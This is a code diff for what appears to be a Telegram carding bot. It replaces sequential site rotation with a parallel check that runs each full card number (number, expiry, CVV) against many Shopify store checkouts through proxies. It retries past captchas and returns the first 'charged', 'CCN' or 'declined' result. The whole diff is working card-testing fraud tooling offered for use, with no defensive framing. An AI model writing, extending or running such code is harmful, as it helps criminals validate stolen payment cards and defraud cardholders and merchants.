@@ -33,6 +33,94 @@ except ImportError:
 MAX_SITE_RETRIES = 5
 
 
+def _is_valid_shopify_response(rotator: SiteRotator, resp: str) -> bool:
+    """True if proper card response (charged/CCN/declined). False for captcha/site/HTTP/JSON errors."""
+    if not resp:
+        return False
+    if rotator.is_real_response(resp):
+        return True
+    if rotator.should_retry(resp):
+        return False
+    u = resp.upper()
+    invalid = (
+        "CAPTCHA" in u or "HCAPTCHA" in u or "SITE_" in u or "CART_" in u or "SESSION_" in u
+        or "ERROR" in u or "TIMEOUT" in u or "CONNECTION" in u or "JSON" in u or "HTTP" in u
+    )
+    return not invalid
+
+
+async def check_card_all_sites_parallel(
+    user_id: str,
+    fullcc: str,
+    proxy,
+) -> tuple:
+    """
+    Run Shopify check across all user sites in parallel.
+    First valid response wins; cancel remaining site-tasks, return result, then next CC.
+    Valid = proper decline/approved/charged/CCN. Invalid = captcha, HTTP, site, JSON errors.
+    """
+    sites = get_user_sites(user_id)
+    sites = [s for s in sites if s.get("active", True)]
+    if not sites:
+        return (
+            {"Response": "NO_SITES_CONFIGURED", "Status": False, "Gateway": "Unknown", "Price": "0.00", "cc": fullcc},
+            0,
+        )
+
+    rotator = SiteRotator(user_id, max_retries=MAX_SITE_RETRIES)
+
+    async def check_one(site_info: dict):
+        url = site_info.get("url", "")
+        gate = site_info.get("gateway", "Shopify")
+        try:
+            async with TLSAsyncSession(timeout_seconds=120, proxy=proxy) as session:
+                res = await autoshopify_with_captcha_retry(
+                    url, fullcc, session, max_captcha_retries=5, proxy=proxy
+                )
+            return (url, gate, res)
+        except Exception as e:
+            return (url, gate, {"Response": f"ERROR: {str(e)[:50]}", "Status": False, "Gateway": gate, "Price": "0.00", "cc": fullcc})
+
+    tasks = [asyncio.create_task(check_one(s)) for s in sites]
+    last_res = None
+    last_gate = "Unknown"
+
+    try:
+        while tasks:
+            done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
+            for t in done:
+                try:
+                    url, gate, res = t.result()
+                except asyncio.CancelledError:
+                    continue
+                except Exception as e:
+                    gate = "Unknown"
+                    res = {"Response": f"ERROR: {str(e)[:50]}", "Status": False, "Gateway": gate, "Price": "0.00", "cc": fullcc}
+                resp = str((res or {}).get("Response", ""))
+                last_res, last_gate = res, gate
+                if _is_valid_shopify_response(rotator, resp):
+                    for p in pending:
+                        p.cancel()
+                    res["Gateway"] = gate
+                    return (res, 0)
+            tasks = list(pending)
+    except asyncio.CancelledError:
+        pass
+    for t in tasks:
+        try:
+            t.cancel()
+        except Exception:
+            pass
+
+    if last_res is not None:
+        last_res["Gateway"] = last_gate
+        return (last_res, 0)
+    return (
+        {"Response": "UNKNOWN", "Status": False, "Gateway": "Unknown", "Price": "0.00", "cc": fullcc},
+        0,
+    )
+
+
 def extract_card(text: str):
     """Extract card details from text in format cc|mm|yy|cvv."""
     match = re.search(r'(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
@@ -342,127 +430,20 @@ Use <code>/txturl site1.com site2.com</code> for multiple sites.""",
         
         has_proxy = True
         
-        # Loading animation frames
-        loading_frames = ["◐", "◓", "◑", "◒"]
-        
-        # Get initial site
-        current_site = rotator.get_current_site()
-        site_url = current_site.get("url")
-        gate = current_site.get("gateway", "Shopify")
-        
-        # Show processing message
+        # Show processing message (parallel across all sites)
+        site_count = rotator.get_site_count()
         loading_msg = await message.reply(
             f"""<pre>Processing Request...</pre>
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 <b>• Card:</b> <code>{fullcc}</code>
-<b>• Gate:</b> <code>{gate}</code>
-<b>• Sites:</b> <code>{rotator.get_site_count()}</code>
-<b>• Status:</b> <i>Checking... {loading_frames[0]}</i>
-<b>• Retries:</b> <code>0</code>""",
+<b>• Gate:</b> <code>Shopify</code>
+<b>• Sites:</b> <code>{site_count}</code> (parallel)
+<b>• Status:</b> <i>Checking...</i>""",
             reply_to_message_id=message.id,
             parse_mode=ParseMode.HTML
         )
-        
-        # Site rotation with retry logic
-        result = None
-        retry_count = 0
-        frame_idx = 0
-        sites_tried = 0
-        
-        while retry_count < MAX_SITE_RETRIES:
-            try:
-                # Update loading animation
-                frame_idx = (frame_idx + 1) % len(loading_frames)
-                sites_tried += 1
-                
-                # Get current site for this attempt
-                current_site = rotator.get_current_site()
-                if not current_site:
-                    break
-                
-                site_url = current_site.get("url")
-                gate = current_site.get("gateway", "Shopify")
-                
-                try:
-                    await loading_msg.edit(
-                        f"""<pre>Processing Request...</pre>
-━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
-<b>• Card:</b> <code>{fullcc}</code>
-<b>• Site:</b> <code>{site_url[:30]}...</code>
-<b>• Gate:</b> <code>{gate}</code>
-<b>• Status:</b> <i>Checking... {loading_frames[frame_idx]}</i>
-<b>• Retries:</b> <code>{retry_count}</code> | Sites: <code>{sites_tried}/{rotator.get_site_count()}</code>""",
-                        parse_mode=ParseMode.HTML
-                    )
-                except:
-                    pass
-                
-                async with TLSAsyncSession(timeout_seconds=120, proxy=user_proxy) as session:
-                    result = await autoshopify_with_captcha_retry(
-                        site_url, fullcc, session,
-                        max_captcha_retries=5,
-                        proxy=user_proxy,
-                    )
-                
-                response = str(result.get("Response", ""))
-                
-                # Check if this is a real response (not captcha/site error)
-                if rotator.is_real_response(response):
-                    # Mark site as successful and exit loop
-                    rotator.mark_current_success()
-                    break
-                
-                # Check if we should retry with another site
-                if rotator.should_retry(response):
-                    retry_count += 1
-                    rotator.mark_current_failed()
-                    
-                    # Get next site
-                    next_site = rotator.get_next_site()
-                    if next_site and retry_count < MAX_SITE_RETRIES:
-                        try:
-                            await loading_msg.edit(
-                                f"""<pre>Rotating Site - Retrying...</pre>
-━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
-<b>• Card:</b> <code>{fullcc}</code>
-<b>• Response:</b> <code>{response[:30]}...</code>
-<b>• Status:</b> <i>Switching site... {loading_frames[frame_idx]}</i>
-<b>• Retries:</b> <code>{retry_count}/{MAX_SITE_RETRIES}</code>""",
-                                parse_mode=ParseMode.HTML
-                            )
-                        except:
-                            pass
-                        await asyncio.sleep(1.5)
-                        continue
-                    else:
-                        # No more sites or max retries reached
-                        break
-                else:
-                    # Not a retry-worthy response, just break
-                    break
-                
-            except Exception as e:
-                result = {
-                    "Response": f"ERROR: {str(e)[:60]}",
-                    "Status": False,
-                    "Gateway": gate,
-                    "Price": "0.00",
-                    "cc": fullcc
-                }
-                retry_count += 1
-                next_site = rotator.get_next_site()
-                if not next_site or retry_count >= MAX_SITE_RETRIES:
-                    break
-                await asyncio.sleep(1)
-        
-        if result is None:
-            result = {
-                "Response": "ERROR: ALL_SITES_FAILED",
-                "Status": False,
-                "Gateway": "Unknown",
-                "Price": "0.00",
-                "cc": fullcc
-            }
+
+        result, retry_count = await check_card_all_sites_parallel(user_id, fullcc, user_proxy)
         
         time_taken = round(time() - start_time, 2)
         
